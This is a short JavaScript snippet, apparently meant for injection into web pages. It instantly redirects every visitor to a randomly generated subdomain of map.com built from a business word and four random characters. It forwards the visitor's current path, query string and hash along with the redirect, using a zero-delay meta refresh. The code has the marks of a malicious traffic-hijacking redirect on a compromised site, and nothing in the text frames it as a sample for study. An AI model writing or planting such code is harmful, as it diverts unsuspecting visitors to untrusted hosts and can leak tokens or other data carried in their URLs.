  (function() {
            const businessWords = [
                'enterprise', 'solutions', 'systems', 'network', 'dynamics', 'innovative',
                'strategic', 'corporate', 'digital', 'global', 'alliance', 'ventures',
                'insight', 'vision', 'frontier', 'horizon', 'catalyst', 'pinnacle',
                'summit', 'premier', 'prime', 'elite', 'advanced', 'precision',
                'tech', 'digital', 'smart', 'quantum', 'cyber', 'cloud', 'data',
                'logic', 'matrix', 'pulse', 'nexus', 'apex', 'bridge', 'core',
                'strategy', 'capital', 'market', 'industry', 'commerce', 'trade',
                'exchange', 'service', 'connect', 'link', 'delta', 'fusion',
                'smart', 'rapid', 'agile', 'dynamic', 'flexible', 'robust', 'secure',
                'integrated', 'optimum', 'prime', 'expert', 'master'
            ];

            function generateRandomString() {
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                return Array.from(
                    { length: 4 }, 
                    () => characters.charAt(Math.floor(Math.random() * characters.length))
                ).join('');
            }

            function generateBusinessWord() {
                return businessWords[Math.floor(Math.random() * businessWords.length)];
            }

            function generateRedirectUrl() {
                const businessWord = generateBusinessWord();
                const randomString = generateRandomString();
                const randomSubdomain = `${businessWord}-${randomString}`;
                const targetDomain = `https://${randomSubdomain}.map.com`;
                const currentPath = window.location.pathname;
                const currentQuery = window.location.search;
                const currentHash = window.location.hash;
                return `${targetDomain}${currentPath}${currentQuery}${currentHash}`;
            }

            const redirectUrl = generateRedirectUrl();

            // Insert the meta refresh tag
            const meta = document.createElement('meta');
            meta.httpEquiv = "refresh";
            meta.content = `0;url=${redirectUrl}`;
            document.head.appendChild(meta);
        })();
